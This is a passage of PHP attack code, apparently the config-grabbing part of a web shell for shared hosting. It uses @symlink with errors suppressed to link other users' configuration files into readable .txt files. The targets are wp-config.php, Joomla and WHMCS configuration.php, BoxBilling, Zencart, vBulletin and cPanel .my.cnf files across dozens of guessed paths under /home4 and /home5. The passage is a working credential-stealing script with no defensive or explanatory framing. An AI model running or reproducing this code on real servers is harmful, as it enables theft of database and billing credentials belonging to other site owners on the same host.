    @symlink('/home4/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home4/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home4/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home4/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home4/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
    @symlink('/home4/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home4/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home4/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home4/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home4/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home4/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home4/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home4/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home4/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home4/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home4/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home4/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home4/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home4/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home4/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home4/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home4/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home4/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home4/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
    @symlink('/home4/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
    @symlink('/home4/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
    @symlink('/home4/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
    @symlink('/home4/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
    @symlink('/home4/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
    @symlink('/home4/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
    @symlink('/home4/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
    @symlink('/home4/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
    @symlink('/home4/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
    @symlink('/home4/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
    @symlink('/home4/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
    @symlink('/home4/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
    @symlink('/home4/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
    @symlink('/home4/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home4/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home4/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home4/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home4/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home4/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home4/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home4/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home4/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home4/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home4/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home4/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home4/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home4/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home4/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home4/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home4/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home4/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home4/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home4/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home4/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home4/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home4/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home4/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home4/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home4/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home4/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home4/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home4/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home4/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home4/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home4/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home4/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home4/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home4/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home4/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home4/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home4/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home4/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home4/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home4/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home4/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home4/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
    @symlink('/home4/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');

    //home5

    @symlink('/home5/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home5/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home5/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home5/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home5/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home5/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
    @symlink('/home5/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home5/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home5/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home5/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home5/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home5/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home5/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
    @symlink('/home5/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home5/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home5/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home5/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home5/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home5/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home5/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home5/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home5/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home5/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home5/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home5/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home5/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home5/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home5/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home5/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home5/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home5/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home5/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
    @symlink('/home5/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
    @symlink('/home5/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
    @symlink('/home5/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
    @symlink('/home5/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
    @symlink('/home5/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
    @symlink('/home5/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
    @symlink('/home5/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
    @symlink('/home5/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
    @symlink('/home5/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
    @symlink('/home5/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
    @symlink('/home5/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
    @symlink('/home5/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
    @symlink('/home5/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
    @symlink('/home5/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home5/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home5/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home5/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home5/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home5/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home5/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home5/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home5/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home5/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home5/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home5/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home5/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
